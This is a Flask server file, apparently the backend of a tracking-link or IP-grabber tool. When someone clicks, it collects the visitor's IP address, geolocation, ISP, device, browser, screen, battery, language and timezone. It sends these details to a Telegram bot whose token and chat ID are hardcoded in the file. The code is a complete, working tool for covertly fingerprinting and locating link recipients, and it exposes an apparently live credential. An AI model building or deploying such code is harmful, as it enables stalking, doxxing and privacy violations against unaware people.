from flask import Flask, render_template, request
import requests
import datetime

app = Flask(__name__)

# Your Telegram Bot Setup
BOT_TOKEN = '7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo'
CHAT_ID = '6690693429'

def send_telegram_alert(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = request.remote_addr

    # Get IP info
    ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
    loc = ip_info.get("city", "") + ", " + ip_info.get("region", "") + " (" + ip_info.get("country", "") + ")"
    isp = ip_info.get("org", "")
    
    # Get Time
    time = datetime.datetime.now().strftime("%d-%b-%Y %I:%M %p")

    msg = f"""
📥 New Click Logged!

🌐 IP: {ip}
🌎 Location: {loc}
📡 ISP: {isp}

📱 Device: {data.get('device')}
🧠 Browser: {data.get('browser')}
📏 Screen: {data.get('screen')}
🔋 Battery: {data.get('battery')}
🗣 Language: {data.get('lang')}
🕒 Timezone: {data.get('timezone')}
🔗 Referrer: {data.get('ref')}

⏱ Time: {time}
"""
    send_telegram_alert(msg)
    return {"status": "logged"}
